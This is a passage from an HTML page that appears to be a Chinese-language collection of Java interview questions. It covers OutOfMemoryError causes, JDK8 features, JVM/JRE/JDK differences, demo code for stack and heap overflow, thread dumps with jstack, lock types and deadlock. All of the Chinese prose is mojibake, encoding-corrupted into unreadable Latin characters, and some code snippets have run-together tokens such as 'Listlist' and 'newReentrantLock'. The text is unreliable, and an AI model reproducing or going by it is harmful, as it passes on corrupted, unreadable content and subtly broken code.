å—çš„å†…éƒ¨ï¼Œå½“ç¨‹åºå‡ºç°æŸç§é€»è¾‘é”™è¯¯æ—¶ç”±ç¨‹åºå‘˜ä¸»åŠ¨æŠ›å‡ºæŸç§ç‰¹å®šç±»å‹çš„å¼‚å¸¸</p><p>throwsæ˜¯æ–¹æ³•å¯èƒ½æŠ›å‡ºå¼‚å¸¸çš„å£°æ˜ã€‚(ç”¨åœ¨å£°æ˜æ–¹æ³•æ—¶ï¼Œè¡¨ç¤ºè¯¥æ–¹æ³•å¯èƒ½è¦æŠ›å‡ºå¼‚å¸¸)</p><h2><span id="oomåŸå› æœ‰å“ªäº›å¦‚ä½•è§£å†³">OOMåŸå› æœ‰å“ªäº›ï¼Œå¦‚ä½•è§£å†³ï¼Ÿ</span></h2><p>é¦–å…ˆï¼ŒOOM å¦‚æœé€šä¿—ç‚¹å„¿è¯´ï¼Œå°±æ˜¯ JVM å†…å­˜ä¸å¤Ÿç”¨äº†ã€‚æ²¡æœ‰ç©ºé—²å†…å­˜ï¼Œè€Œä¸”åƒåœ¾å›æ”¶å™¨ä¹Ÿæ— æ³•æä¾›æ›´å¤šå†…å­˜ã€‚</p><p>éšå«çš„æ„æ€æ˜¯åœ¨æŠ›å‡ºOutOfMemoryErrorä¹‹å‰ï¼Œé€šå¸¸åƒåœ¾å›æ”¶å™¨ä¼šè¢«è§¦å‘ï¼Œå°½å…¶æ‰€èƒ½å»æ¸…ç†å‡ºç©ºé—´ã€‚</p><p>å½“ç„¶ä¹Ÿä¸æ˜¯åœ¨ä»»ä½•æƒ…å†µä¸‹åƒåœ¾å›æ”¶å™¨éƒ½ä¼šè§¦å‘ã€‚æ¯”å¦‚æˆ‘ä»¬åˆ†é…ä¸€ä¸ªè¶…å¤§å¯¹è±¡ï¼Œç±»ä¼¼ä¸€ä¸ªè¶…å¤§æ•°ç»„è¶…è¿‡å †çš„æœ€å¤§å€¼ï¼ŒJVMä¼šåˆ¤æ–­åƒåœ¾å›æ”¶å¹¶ä¸èƒ½è§£å†³è¿™ä¸ªé—®é¢˜ï¼Œæ‰€ä»¥ç›´æ¥æŠ›å‡ºOutOfMemoryErrorã€‚</p><p>é™¤äº†ç¨‹åºè®¡æ•°å™¨ï¼Œå…¶ä»–åŒºåŸŸéƒ½æœ‰å¯èƒ½ä¼šå› ä¸ºå¯èƒ½çš„ç©ºé—´ä¸è¶³äº§ç”ŸOutOfMemoryErrorã€‚æ€»ç»“å¦‚ä¸‹ï¼š</p><ul><li><p>å †å†…å­˜ä¸è¶³æ˜¯å¸¸è§çš„OOMåŸå› ä¹‹ä¸€OutOfMemoryErrorï¼šJava heap spaceåŸå› æœ‰å¾ˆå¤šï¼Œæ¯”å¦‚å†…å­˜æ³„æ¼ã€å †å¤§å°è®¾ç½®ä¸è¶³ã€JVMå¤„ç†ä¸åŠæ—¶ã€å†…å­˜æ— æ³•é‡Šæ”¾</p></li><li><p>Java è™šæ‹Ÿæœºæ ˆå’Œæœ¬åœ°æ–¹æ³•æ ˆã€‚æ¯”å¦‚å†™ä¸€æ®µé€’å½’æ²¡æœ‰è·³å‡ºæ¡ä»¶ã€‚ä¼šä¸æ–­å‹æ ˆã€‚å¯¼è‡´StackOverFlowError</p></li></ul><h2><span id="jdk8-æ–°ç‰¹æ€§">JDK8 æ–°ç‰¹æ€§</span></h2><ul><li><p>Lambdaè¡¨è¾¾å¼å’Œå‡½æ•°å¼æ¥å£</p></li><li><p>æ¥å£çš„é»˜è®¤æ–¹æ³•å’Œé™æ€æ–¹æ³•</p></li><li><p>é‡å¤æ³¨è§£</p></li><li><p>Streams</p></li><li><p>ä½¿ç”¨å…ƒç©ºé—´ä»£æ›¿æ°¸ä¹…ä»£</p></li></ul><h2><span id="jvmjdkå’Œjreæœ‰ä»€ä¹ˆåŒºåˆ«ä¸è”ç³»">JVMï¼ŒJDKå’ŒJREæœ‰ä»€ä¹ˆåŒºåˆ«ä¸è”ç³»</span></h2><p><strong>1ã€JVM</strong></p><p>JVMæ˜¯JavaVirtual Machineï¼ˆJavaè™šæ‹Ÿæœºï¼‰çš„ç¼©å†™ï¼Œå®ƒæ˜¯æ•´ä¸ªjavaå®ç°è·¨å¹³å°çš„æœ€æ ¸å¿ƒçš„éƒ¨åˆ†ï¼Œæ‰€æœ‰çš„javaç¨‹åºä¼šé¦–å…ˆè¢«ç¼–è¯‘ä¸º.classçš„ç±»æ–‡ä»¶ï¼Œè¿™ç§ç±»æ–‡ä»¶å¯ä»¥åœ¨è™šæ‹Ÿæœºä¸Šæ‰§è¡Œï¼Œä¹Ÿå°±æ˜¯è¯´classå¹¶ä¸ç›´æ¥ä¸æœºå™¨çš„æ“ä½œç³»ç»Ÿç›¸å¯¹åº”ï¼Œè€Œæ˜¯ç»è¿‡è™šæ‹Ÿæœºé—´æ¥ä¸æ“ä½œç³»ç»Ÿäº¤äº’ï¼Œç”±è™šæ‹Ÿæœºå°†ç¨‹åºè§£é‡Šç»™æœ¬åœ°ç³»ç»Ÿæ‰§è¡Œã€‚JVMæ˜¯Javaå¹³å°çš„åŸºç¡€ï¼Œå’Œå®é™…çš„æœºå™¨ä¸€æ ·ï¼Œå®ƒä¹Ÿæœ‰è‡ªå·±çš„æŒ‡ä»¤é›†ï¼Œå¹¶ä¸”åœ¨è¿è¡Œæ—¶æ“ä½œä¸åŒçš„å†…å­˜åŒºåŸŸã€‚ JVMé€šè¿‡æŠ½è±¡æ“ä½œç³»ç»Ÿå’ŒCPUç»“æ„ï¼Œæä¾›äº†ä¸€ç§ä¸å¹³å°æ— å…³çš„ä»£ç æ‰§è¡Œæ–¹æ³•ï¼Œå³ä¸ç‰¹æ®Šçš„å®ç°æ–¹æ³•ã€ä¸»æœºç¡¬ä»¶ã€ä¸»æœºæ“ä½œç³»ç»Ÿæ— å…³ã€‚JVMçš„ä¸»è¦å·¥ä½œæ˜¯è§£é‡Šè‡ªå·±çš„æŒ‡ä»¤é›†ï¼ˆå³å­—èŠ‚ç ï¼‰åˆ°CPUçš„æŒ‡ä»¤é›†æˆ–å¯¹åº”çš„ç³»ç»Ÿè°ƒç”¨ï¼Œä¿æŠ¤ç”¨æˆ·å…è¢«æ¶æ„ç¨‹åºéªšæ‰°ã€‚ JVMå¯¹ä¸Šå±‚çš„Javaæºæ–‡ä»¶æ˜¯ä¸å…³å¿ƒçš„ï¼Œå®ƒå…³æ³¨çš„åªæ˜¯ç”±æºæ–‡ä»¶ç”Ÿæˆçš„ç±»æ–‡ä»¶ï¼ˆ.classæ–‡ä»¶ï¼‰ã€‚</p><p><strong>2ã€JRE</strong></p><p>JREæ˜¯java runtime environmentï¼ˆjavaè¿è¡Œç¯å¢ƒï¼‰çš„ç¼©å†™ã€‚å…‰æœ‰JVMè¿˜ä¸èƒ½è®©classæ–‡ä»¶æ‰§è¡Œï¼Œå› ä¸ºåœ¨è§£é‡Šclassçš„æ—¶å€™JVMéœ€è¦è°ƒç”¨è§£é‡Šæ‰€éœ€è¦çš„ç±»åº“libã€‚åœ¨JDKçš„å®‰è£…ç›®å½•é‡Œä½ å¯ä»¥æ‰¾åˆ°jreç›®å½•ï¼Œé‡Œé¢æœ‰ä¸¤ä¸ªæ–‡ä»¶å¤¹binå’Œlib,åœ¨è¿™é‡Œå¯ä»¥è®¤ä¸ºbiné‡Œçš„å°±æ˜¯jvmï¼Œ<font color="red">libä¸­åˆ™æ˜¯jvmå·¥ä½œæ‰€éœ€è¦çš„ç±»åº“ï¼Œè€Œjvmå’Œlibå’Œèµ·æ¥å°±ç§°ä¸ºjre</font>ã€‚æ‰€ä»¥ï¼Œåœ¨ä½ å†™å®Œjavaç¨‹åºç¼–è¯‘æˆ.classä¹‹åï¼Œä½ å¯ä»¥æŠŠè¿™ä¸ª.classæ–‡ä»¶å’Œjreä¸€èµ·æ‰“åŒ…å‘ç»™æœ‹å‹ï¼Œè¿™æ ·ä½ çš„æœ‹å‹å°±å¯ä»¥è¿è¡Œä½ å†™ç¨‹åºäº†ï¼ˆjreé‡Œæœ‰è¿è¡Œ.classçš„java.exeï¼‰ã€‚JREæ˜¯Sunå…¬å¸å‘å¸ƒçš„ä¸€ä¸ªæ›´å¤§çš„ç³»ç»Ÿï¼Œå®ƒé‡Œé¢å°±æœ‰ä¸€ä¸ªJVMã€‚JREå°±ä¸å…·ä½“çš„CPUç»“æ„å’Œæ“ä½œç³»ç»Ÿæœ‰å…³ï¼Œæ˜¯è¿è¡ŒJavaç¨‹åºå¿…ä¸å¯å°‘çš„ï¼ˆé™¤éç”¨å…¶ä»–ä¸€äº›ç¼–è¯‘ç¯å¢ƒç¼–è¯‘æˆ.exeå¯æ‰§è¡Œæ–‡ä»¶â€¦â€¦ï¼‰ï¼ŒJREçš„åœ°ä½å°±è±¡ä¸€å°PCæœºä¸€æ ·ï¼Œæˆ‘ä»¬å†™å¥½çš„Win32åº”ç”¨ç¨‹åºéœ€è¦æ“ä½œç³»ç»Ÿå¸®æˆ‘ä»¬è¿è¡Œï¼ŒåŒæ ·çš„ï¼Œæˆ‘ä»¬ç¼–å†™çš„Javaç¨‹åºä¹Ÿå¿…é¡»è¦JREæ‰èƒ½è¿è¡Œã€‚ ä¹Ÿå¯ä»¥è¯´JREæ˜¯æä¾›ç»™ä¸šä½™çš„äººæ¥ç›´æ¥ä½¿ç”¨è¿è¡Œç¼–è¯‘åjavaç¨‹åºçš„ã€‚</p><p><strong>3ã€JDK</strong></p><p>JDKæ˜¯java development kitï¼ˆjavaå¼€å‘å·¥å…·åŒ…ï¼‰çš„ç¼©å†™ã€‚æ¯ä¸ªåšjavaå¼€å‘çš„äººéƒ½ä¼šå…ˆåœ¨æœºå™¨ä¸Šè£…ä¸€ä¸ªJDKï¼Œé‚£ è®©æˆ‘ä»¬çœ‹ä¸€ä¸‹JDKçš„å®‰è£…ç›®å½•ã€‚åœ¨ç›®å½•ä¸‹é¢æœ‰å…­ä¸ªæ–‡ä»¶å¤¹ã€ä¸€ä¸ªsrcç±»åº“æºç å‹ç¼©åŒ…ã€å’Œå…¶ä»–å‡ ä¸ªå£°æ˜æ–‡ä»¶ã€‚å…¶ä¸­ï¼ŒçœŸæ­£åœ¨è¿è¡Œjavaæ—¶èµ·ä½œç”¨çš„æ˜¯ä»¥ä¸‹å››ä¸ªæ–‡ä»¶å¤¹ï¼šbinã€includeã€libã€jreã€‚ç°åœ¨æˆ‘ä»¬å¯ä»¥çœ‹å‡ºè¿™æ ·ä¸€ä¸ªå…³ç³»ï¼ŒJDKåŒ…å«JREï¼Œè€ŒJREåŒ…å«JVMã€‚</p><p>bin: æœ€ä¸»è¦çš„æ˜¯ç¼–è¯‘å™¨(javac.exe)</p><p>include: javaå’ŒJVMäº¤äº’ç”¨çš„å¤´æ–‡ä»¶</p><p>libï¼šç±»åº“ ï¼ˆjavaå¼€å‘éœ€è¦çš„ç±»åº“ï¼‰  </p><p>jre: javaè¿è¡Œç¯å¢ƒ </p><p><font color="red">ï¼ˆæ³¨æ„ï¼šè¿™é‡Œçš„binã€libæ–‡ä»¶å¤¹å’Œjreé‡Œçš„binã€libæ˜¯ä¸åŒçš„ï¼‰æ€»çš„æ¥è¯´JDKæ˜¯ç”¨äºjavaç¨‹åºçš„å¼€å‘,è€Œjreåˆ™æ˜¯åªèƒ½è¿è¡Œclassè€Œæ²¡æœ‰ç¼–è¯‘çš„åŠŸèƒ½ã€‚eclipseã€ideaç­‰å…¶ä»–IDEæœ‰è‡ªå·±çš„ç¼–è¯‘å™¨è€Œä¸æ˜¯ç”¨JDK binç›®å½•ä¸­è‡ªå¸¦çš„ï¼Œæ‰€ä»¥åœ¨å®‰è£…æ—¶ä½ ä¼šå‘ç°ä»–ä»¬åªè¦æ±‚ä½ é€‰jreè·¯å¾„å°±okäº†ã€‚</font></p><h2><span id="åˆ†åˆ«å†™å‡ºå †å†…å­˜æº¢å‡ºä¸æ ˆå†…å­˜æº¢å‡ºçš„ç¨‹åº">åˆ†åˆ«å†™å‡ºå †å†…å­˜æº¢å‡ºä¸æ ˆå†…å­˜æº¢å‡ºçš„ç¨‹åº</span></h2><p>æ ˆå†…å­˜æº¢å‡º</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">f</span><span class="params">()</span> &#123;</span><br><span class="line">    f();    </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å †å†…å­˜æº¢å‡º</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">testd</span><span class="params">()</span> &#123;</span><br><span class="line">    Listlist = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;();         </span><br><span class="line">    <span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>;         </span><br><span class="line">    <span class="keyword">while</span> (<span class="literal">true</span>) &#123;            </span><br><span class="line">        list.add(<span class="keyword">new</span> <span class="title class_">String</span>(i + <span class="string">&quot;&quot;</span>));            </span><br><span class="line">        i++;        </span><br><span class="line">    &#125;    </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2><span id="dumpæ–‡ä»¶çš„ä½œç”¨æ˜¯ä»€ä¹ˆå¦‚ä½•è·å–çº¿ç¨‹çš„dumpæ–‡ä»¶">dumpæ–‡ä»¶çš„ä½œç”¨æ˜¯ä»€ä¹ˆï¼Ÿå¦‚ä½•è·å–çº¿ç¨‹çš„dumpæ–‡ä»¶?</span></h2><p>dumpæ–‡ä»¶çš„ä½œç”¨ï¼š</p><p>æ­»å¾ªç¯ã€æ­»é”ã€é˜»å¡ã€é¡µé¢æ‰“å¼€æ…¢ç­‰é—®é¢˜ï¼Œæ‰“çº¿ç¨‹dumpæ˜¯æœ€å¥½çš„è§£å†³é—®é¢˜çš„é€”å¾„ã€‚å› æ­¤ï¼Œçº¿ç¨‹dumpä¹Ÿå°±æ˜¯çº¿ç¨‹å †æ ˆã€‚</p><p>è·å–åˆ°çº¿ç¨‹å †æ ˆdumpæ–‡ä»¶å†…å®¹åˆ†ä¸¤æ­¥ï¼š</p><p>ï¼ˆ1ï¼‰ç¬¬ä¸€æ­¥ï¼šè·å–åˆ°çº¿ç¨‹çš„pidï¼ŒLinuxç¯å¢ƒä¸‹å¯ä»¥ä½¿ç”¨ps -ef | grep java</p><p>ï¼ˆ2ï¼‰ç¬¬äºŒæ­¥ï¼šæ‰“å°çº¿ç¨‹å †æ ˆï¼Œå¯ä»¥é€šè¿‡ä½¿ç”¨jstack pidå‘½ä»¤</p><h2><span id="synchronizedä»€ä¹ˆæƒ…å†µä¸‹ä¼šé‡Šæ”¾é”">synchronizedä»€ä¹ˆæƒ…å†µä¸‹ä¼šé‡Šæ”¾é”</span></h2><p>1ï¼‰è·å–é”çš„çº¿ç¨‹æ‰§è¡Œå®Œäº†è¯¥ä»£ç å—ï¼Œç„¶åçº¿ç¨‹é‡Šæ”¾å¯¹é”çš„å æœ‰ï¼›</p><p>2ï¼‰çº¿ç¨‹æ‰§è¡Œå‘ç”Ÿå¼‚å¸¸ï¼Œæ­¤æ—¶JVMä¼šè®©çº¿ç¨‹è‡ªåŠ¨é‡Šæ”¾é”ã€‚</p><ol start="3"><li>è°ƒç”¨waitæ–¹æ³•,åœ¨ç­‰å¾…çš„æ—¶å€™ç«‹å³é‡Šæ”¾é”,æ–¹ä¾¿å…¶ä»–çš„çº¿ç¨‹ä½¿ç”¨é”.</li></ol><h2><span id="è§£é‡Šä¸€ä¸‹é”çš„ä¸€äº›åŸºæœ¬æ¦‚å¿µå¯é‡å…¥é”-å¯ä¸­æ–­é”-å…¬å¹³é”-è¯»å†™é”">è§£é‡Šä¸€ä¸‹é”çš„ä¸€äº›åŸºæœ¬æ¦‚å¿µï¼šå¯é‡å…¥é”ã€å¯ä¸­æ–­é”ã€å…¬å¹³é”ã€è¯»å†™é”</span></h2><p><strong>1.å¯é‡å…¥é”</strong></p><p>å¦‚æœé”å…·å¤‡å¯é‡å…¥æ€§ï¼Œåˆ™ç§°ä½œä¸ºå¯é‡å…¥é”ã€‚åƒsynchronizedå’ŒReentrantLockéƒ½æ˜¯å¯é‡å…¥é”ï¼Œå¯é‡å…¥æ€§åœ¨æˆ‘çœ‹æ¥å®é™…ä¸Šè¡¨æ˜äº†é”çš„åˆ†é…æœºåˆ¶ï¼šåŸºäºçº¿ç¨‹çš„åˆ†é…ï¼Œè€Œä¸æ˜¯åŸºäºæ–¹æ³•è°ƒç”¨çš„åˆ†é…ã€‚ä¸¾ä¸ªç®€å•çš„ä¾‹å­ï¼Œå½“ä¸€ä¸ªçº¿ç¨‹æ‰§è¡Œåˆ°æŸä¸ªsynchronizedæ–¹æ³•æ—¶ï¼Œæ¯”å¦‚è¯´method1ï¼Œè€Œåœ¨method1ä¸­ä¼šè°ƒç”¨å¦å¤–ä¸€ä¸ªsynchronizedæ–¹æ³•method2ï¼Œæ­¤æ—¶çº¿ç¨‹ä¸å¿…é‡æ–°å»ç”³è¯·é”ï¼Œè€Œæ˜¯å¯ä»¥ç›´æ¥æ‰§è¡Œæ–¹æ³•method2ã€‚</p><p>çœ‹ä¸‹é¢è¿™æ®µä»£ç å°±æ˜ç™½äº†ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">MyClass</span> &#123;    </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">synchronized</span> <span class="keyword">void</span> <span class="title function_">method1</span><span class="params">()</span> &#123;        </span><br><span class="line">        method2();    </span><br><span class="line">    &#125;         </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">synchronized</span> <span class="keyword">void</span> <span class="title function_">method2</span><span class="params">()</span> &#123;             </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ä¸Šè¿°ä»£ç ä¸­çš„ä¸¤ä¸ªæ–¹æ³•method1å’Œmethod2éƒ½ç”¨synchronizedä¿®é¥°äº†ï¼Œå‡å¦‚æŸä¸€æ—¶åˆ»ï¼Œçº¿ç¨‹Aæ‰§è¡Œåˆ°äº†method1ï¼Œæ­¤æ—¶çº¿ç¨‹Aè·å–äº†è¿™ä¸ªå¯¹è±¡çš„é”ï¼Œè€Œç”±äºmethod2ä¹Ÿæ˜¯synchronizedæ–¹æ³•ï¼Œå‡å¦‚synchronizedä¸å…·å¤‡å¯é‡å…¥æ€§ï¼Œæ­¤æ—¶çº¿ç¨‹Aéœ€è¦é‡æ–°ç”³è¯·é”ã€‚ä½†æ˜¯è¿™å°±ä¼šé€ æˆä¸€ä¸ªé—®é¢˜ï¼Œå› ä¸ºçº¿ç¨‹Aå·²ç»æŒæœ‰äº†è¯¥å¯¹è±¡çš„é”ï¼Œè€Œåˆåœ¨ç”³è¯·è·å–è¯¥å¯¹è±¡çš„é”ï¼Œè¿™æ ·å°±ä¼šçº¿ç¨‹Aä¸€ç›´ç­‰å¾…æ°¸è¿œä¸ä¼šè·å–åˆ°çš„é”ã€‚</p><p>è€Œç”±äºsynchronizedå’ŒLockéƒ½å…·å¤‡å¯é‡å…¥æ€§ï¼Œæ‰€ä»¥ä¸ä¼šå‘ç”Ÿä¸Šè¿°ç°è±¡ã€‚</p><p><strong>2.å¯ä¸­æ–­é”</strong></p><p>å¯ä¸­æ–­é”ï¼šé¡¾åæ€ä¹‰ï¼Œå°±æ˜¯å¯ä»¥ç›¸åº”ä¸­æ–­çš„é”ã€‚</p><p>åœ¨Javaä¸­ï¼Œsynchronizedå°±ä¸æ˜¯å¯ä¸­æ–­é”ï¼Œè€ŒLockæ˜¯å¯ä¸­æ–­é”ã€‚å¦‚æœæŸä¸€çº¿ç¨‹Aæ­£åœ¨æ‰§è¡Œé”ä¸­çš„ä»£ç ï¼Œå¦ä¸€çº¿ç¨‹Bæ­£åœ¨ç­‰å¾…è·å–è¯¥é”ï¼Œå¯èƒ½ç”±äºç­‰å¾…æ—¶é—´è¿‡é•¿ï¼Œçº¿ç¨‹Bä¸æƒ³ç­‰å¾…äº†ï¼Œæƒ³å…ˆå¤„ç†å…¶ä»–äº‹æƒ…ï¼Œæˆ‘ä»¬å¯ä»¥è®©å®ƒä¸­æ–­è‡ªå·±æˆ–è€…åœ¨åˆ«çš„çº¿ç¨‹ä¸­ä¸­æ–­å®ƒï¼Œè¿™ç§å°±æ˜¯å¯ä¸­æ–­é”ã€‚åœ¨å‰é¢æ¼”ç¤ºlockInterruptibly()çš„ç”¨æ³•æ—¶å·²ç»ä½“ç°äº†Lockçš„å¯ä¸­æ–­æ€§ã€‚</p><p><strong>3.å…¬å¹³é”</strong></p><p>å…¬å¹³é”ï¼šå³å°½é‡ä»¥è¯·æ±‚é”çš„é¡ºåºæ¥è·å–é”ã€‚æ¯”å¦‚åŒæ˜¯æœ‰å¤šä¸ªçº¿ç¨‹åœ¨ç­‰å¾…ä¸€ä¸ªé”ï¼Œå½“è¿™ä¸ªé”è¢«é‡Šæ”¾æ—¶ï¼Œç­‰å¾…æ—¶é—´æœ€ä¹…çš„çº¿ç¨‹ï¼ˆæœ€å…ˆè¯·æ±‚çš„çº¿ç¨‹ï¼‰ä¼šè·å¾—è¯¥æ‰€ï¼Œè¿™ç§å°±æ˜¯å…¬å¹³é”ã€‚</p><p>éå…¬å¹³é”ï¼šå³æ— æ³•ä¿è¯é”çš„è·å–æ˜¯æŒ‰ç…§è¯·æ±‚é”çš„é¡ºåºè¿›è¡Œçš„ã€‚è¿™æ ·å°±å¯èƒ½å¯¼è‡´æŸä¸ªæˆ–è€…ä¸€äº›çº¿ç¨‹æ°¸è¿œè·å–ä¸åˆ°é”ã€‚</p><p>åœ¨Javaä¸­ï¼Œsynchronizedå°±æ˜¯éå…¬å¹³é”ï¼Œå®ƒæ— æ³•ä¿è¯ç­‰å¾…çš„çº¿ç¨‹è·å–é”çš„é¡ºåºã€‚</p><p>è€Œå¯¹äºReentrantLockå’ŒReentrantReadWriteLockï¼Œå®ƒé»˜è®¤æƒ…å†µä¸‹æ˜¯éå…¬å¹³é”ï¼Œä½†æ˜¯å¯ä»¥è®¾ç½®ä¸ºå…¬å¹³é”ã€‚</p><p>æˆ‘ä»¬å¯ä»¥åœ¨åˆ›å»ºReentrantLockå¯¹è±¡æ—¶ï¼Œé€šè¿‡ä»¥ä¸‹æ–¹å¼æ¥è®¾ç½®é”çš„å…¬å¹³æ€§ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">ReentrantLock</span> <span class="variable">lock</span> <span class="operator">=</span>newReentrantLock(<span class="literal">true</span>)</span><br></pre></td></tr></table></figure><p>å¦‚æœå‚æ•°ä¸ºtrueè¡¨ç¤ºä¸ºå…¬å¹³é”ï¼Œä¸ºfalseä¸ºéå…¬å¹³é”ã€‚é»˜è®¤æƒ…å†µä¸‹ï¼Œå¦‚æœä½¿ç”¨æ— å‚æ„é€ å™¨ï¼Œåˆ™æ˜¯éå…¬å¹³é”ã€‚</p><p><strong>4.è¯»å†™é”</strong></p><p>è¯»å†™é”å°†å¯¹ä¸€ä¸ªèµ„æºï¼ˆæ¯”å¦‚æ–‡ä»¶ï¼‰çš„è®¿é—®åˆ†æˆäº†2ä¸ªé”ï¼Œä¸€ä¸ªè¯»é”å’Œä¸€ä¸ªå†™é”ã€‚</p><p>æ­£å› ä¸ºæœ‰äº†è¯»å†™é”ï¼Œæ‰ä½¿å¾—å¤šä¸ªçº¿ç¨‹ä¹‹é—´çš„è¯»æ“ä½œä¸ä¼šå‘ç”Ÿå†²çªã€‚</p><p>ReadWriteLockå°±æ˜¯è¯»å†™é”ï¼Œå®ƒæ˜¯ä¸€ä¸ªæ¥å£ï¼ŒReentrantReadWriteLockå®ç°äº†è¿™ä¸ªæ¥å£ã€‚</p><p>å¯ä»¥é€šè¿‡readLock()è·å–è¯»é”ï¼Œé€šè¿‡writeLock()è·å–å†™é”ã€‚</p><h2><span id="javaçº¿ç¨‹åŒæ­¥çš„æ–¹å¼æœ‰å“ªäº›">Javaçº¿ç¨‹åŒæ­¥çš„æ–¹å¼æœ‰å“ªäº›</span></h2><ul><li><p>ä½¿ç”¨synchronizedä¿®é¥°çš„åŒæ­¥æ–¹æ³•</p></li><li><p>ä½¿ç”¨åŒæ­¥ä»£ç å—synchronize{}</p></li><li><p>ä½¿ç”¨volatileå˜é‡</p></li><li><p>ä½¿ç”¨ThreadLocal</p></li><li><p>ä½¿ç”¨é‡å…¥é”å®ç°çº¿ç¨‹åŒæ­¥</p></li></ul><h2><span id="ä»€ä¹ˆæ˜¯çº¿ç¨‹å®‰å…¨">ä»€ä¹ˆæ˜¯çº¿ç¨‹å®‰å…¨ï¼Ÿ</span></h2><p>çº¿ç¨‹å®‰å…¨æ˜¯ä¸€ä¸ªå¤šçº¿ç¨‹ç¯å¢ƒä¸‹æ­£ç¡®æ€§çš„æ¦‚å¿µï¼Œä¹Ÿå°±æ˜¯ä¿è¯å¤šçº¿ç¨‹ç¯å¢ƒä¸‹å…±äº«çš„ã€å¯ä¿®æ”¹çš„çŠ¶æ€çš„æ­£ç¡®æ€§ã€‚<br>æ¢å¥è¯è¯´ï¼Œå¦‚æœçŠ¶æ€ä¸å…±äº«ã€ä¸å¯ä¿®æ”¹ï¼Œé‚£ä¹ˆä¹Ÿå°±ä¸å­˜åœ¨çº¿ç¨‹å®‰å…¨é—®é¢˜ã€‚è¿›è€Œå¼•å‡ºç¡®ä¿çº¿ç¨‹å®‰å…¨çš„ä¸¤ä¸ªæ–¹æ³•</p><ul><li>å°è£…ï¼šæŠŠå¯¹è±¡å†…éƒ¨çŠ¶æ€éšè—ã€ä¿æŠ¤èµ·æ¥</li><li>ä¸å¯å˜ï¼šæ¯”å¦‚finalã€immutableç­‰</li></ul><p>çº¿ç¨‹å®‰å…¨éœ€è¦ç¡®ä¿å‡ ä¸ªåŸºæœ¬ç‰¹æ€§ï¼š</p><ul><li>åŸå­æ€§ï¼šç›¸å…³æ“ä½œä¸ä¼šä¸­é€”è¢«å…¶ä»–çº¿ç¨‹å¹²æ‰°ï¼Œä¸€èˆ¬é€šè¿‡åŒæ­¥æœºåˆ¶å®ç°</li><li>å¯è§æ€§ï¼šä¸€ä¸ªçº¿ç¨‹ä¿®æ”¹äº†æŸä¸ªå…±äº«å˜é‡ï¼Œå…¶çŠ¶æ€èƒ½å¤Ÿè¢«å…¶ä»–çº¿ç¨‹çŸ¥æ™“ã€‚è§£é‡Šä¸ºå°†çº¿ç¨‹æœ¬åœ°çŠ¶æ€åæ˜ åˆ°ä¸»å†…å­˜ä¸Šå»ã€‚volatileå°±æ˜¯ç”¨æ¥ä¿è¯å¯è§æ€§çš„</li><li>æœ‰åºæ€§ï¼šä¿è¯çº¿ç¨‹å†…ä¸²è¡Œè¯­ä¹‰ï¼Œé¿å…æŒ‡ä»¤é‡æ’</li></ul><h2><span id="javaç¼–å†™ä¸€ä¸ªä¼šå¯¼è‡´æ­»é”çš„ç¨‹åº">Javaç¼–å†™ä¸€ä¸ªä¼šå¯¼è‡´æ­»é”çš„ç¨‹åºï¼Ÿ</span></h2><p>æ­»é”ç°è±¡æè¿°ï¼š</p><p>çº¿ç¨‹Aå’Œçº¿ç¨‹Bç›¸äº’ç­‰å¾…å¯¹æ–¹æŒæœ‰çš„é”å¯¼è‡´ç¨‹åºæ— é™æ­»å¾ªç¯ä¸‹å»ã€‚</p><p>æ­»é”çš„å®ç°æ­¥éª¤ï¼š</p><p>ï¼ˆ1ï¼‰ä¸¤ä¸ªçº¿ç¨‹é‡Œé¢åˆ†åˆ«æŒæœ‰ä¸¤ä¸ªObjectå¯¹è±¡ï¼šlock1å’Œlock2ã€‚è¿™ä¸¤ä¸ªlockä½œä¸ºåŒæ­¥ä»£ç å—çš„é”ï¼›</p><p>ï¼ˆ2ï¼‰çº¿ç¨‹1çš„run()æ–¹æ³•ä¸­åŒæ­¥ä»£ç å—å…ˆè·å–lock1çš„å¯¹è±¡é”ï¼ŒThread.sleep(xxx)ï¼Œæ—¶é—´ä¸éœ€è¦å¤ªå¤šï¼Œ100æ¯«ç§’å·®ä¸å¤šäº†ï¼Œç„¶åæ¥ç€è·å–lock2çš„å¯¹è±¡é”ã€‚è¿™ä¹ˆåšä¸»è¦æ˜¯ä¸ºäº†é˜²æ­¢çº¿ç¨‹1å¯åŠ¨ä¸€ä¸‹å­å°±è¿ç»­è·å¾—äº†lock1å’Œlock2ä¸¤ä¸ªå¯¹è±¡çš„å¯¹è±¡é”</p><p>ï¼ˆ3ï¼‰çº¿ç¨‹2çš„run)(æ–¹æ³•ä¸­åŒæ­¥ä»£ç å—å…ˆè·å–lock2çš„å¯¹è±¡é”ï¼Œæ¥ç€è·å–lock1çš„å¯¹è±¡é”ï¼Œå½“ç„¶è¿™æ—¶lock1çš„å¯¹è±¡é”å·²ç»è¢«çº¿ç¨‹1é”æŒæœ‰ï¼Œçº¿ç¨‹2è‚¯å®šæ˜¯è¦ç­‰å¾…çº¿ç¨‹1é‡Šæ”¾lock1çš„å¯¹è±¡é”çš„</p><p>è¿™æ 